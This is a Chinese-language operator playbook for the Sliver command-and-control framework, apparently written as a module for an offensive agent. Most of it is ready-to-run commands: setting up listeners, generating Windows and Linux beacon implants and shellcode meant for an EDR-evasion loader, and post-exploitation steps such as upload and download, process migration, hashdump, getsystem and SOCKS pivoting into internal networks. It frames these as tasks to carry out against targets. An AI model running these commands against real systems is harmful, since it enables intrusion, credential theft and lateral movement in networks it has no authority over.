# Sliver C2（P0）

> **TECH：** 长期 operator channel  
> **成功：** `beacons`/`sessions` 里有目标，并能执行一条命令  
> **不是成功：** `generate` 写出文件  
> hashdump → `/creds`；getsystem → `/privesc-win`；网段 TUN → `/tunnel`

安装在 **操作机**，不要在目标上 curl install。

```bash
curl https://sliver.sh/install | sudo bash
sliver-server
```

以当前 `sliver-server --help` / 文档为准。

---

## Listener

不要把 teamserver 管理口对目标网打开。目标只应打到 redirector。

```
https --lhost 0.0.0.0 --lport 443
mtls --lhost 0.0.0.0 --lport 8888
http --lhost 0.0.0.0 --lport 80
```

出网只放 443 时用 HTTPS。DNS beacon 仅当 HTTP(S) 全死，见 `c2-opsec.md`。

---

## 生成 implant

默认 **beacon**（sleep + jitter）。session 仅短时交互。

```
generate beacon --http REDIR --os windows --arch amd64 --skip-symbols --seconds 60 --jitter 20 --name desk01
generate beacon --https REDIR --os linux --arch amd64 --skip-symbols --seconds 60 --jitter 20 --name box01
generate --http REDIR --os windows --arch amd64 --name interact
generate beacon --http REDIR --os windows -f shellcode --skip-symbols -G
```

`-f shellcode` 给 `/edr-bypass` 的 loader，不在本文件写 AMSI。落地 exe 被隔离 → `/edr-bypass` 后换格式再 `generate`。

---

## 会话

```
beacons
sessions
use <id>
whoami
pwd
ls
upload /local/path /remote/path
download /remote/path
execute -o whoami
ps
migrate <PID>
```

`execute-assembly` 跑 Rubeus 等：那是 AD/凭据作业，做完材料交 `/creds` 或让操作者选 `/ad-recon`。不要在这里展开 Kerberoast 流程。

```
# 不要当本模块主路径
hashdump          → /creds
getsystem         → /privesc-win
impersonate       → 令牌作业，提权失败走 /privesc-win
```

---

## 网络（应急 vs 枢轴）

会话里临时：

```
portfwd add -l 8080 -r 10.10.10.100 -p 80
socks5 start
```

要扫/路由整个内网网段 → 停手选 `/tunnel`（Ligolo-ng）。C2 SOCKS 当默认枢轴会把后渗透和可达性缠死。

---

## 其它框架

| 框架 | 角色 |
|---|---|
| **Mythic** | P1。按当前 agent（Apollo/Poseidon/Athena）文档生成；不在本 skill 复制整本 |
| **Havoc** | 可选。先看 https://github.com/HavocFramework/Havoc 是否仍维护再 `make` |
| **Adaptix** | 2025–2026 开源选项，点名即可，不编 CLI |
| Cobalt Strike | 不作为本 skill 必装 |

Mythic 最小入口：起 Mythic 后按 UI/CLI 对所选 payload 生成，成功标准同样是 **callback**。
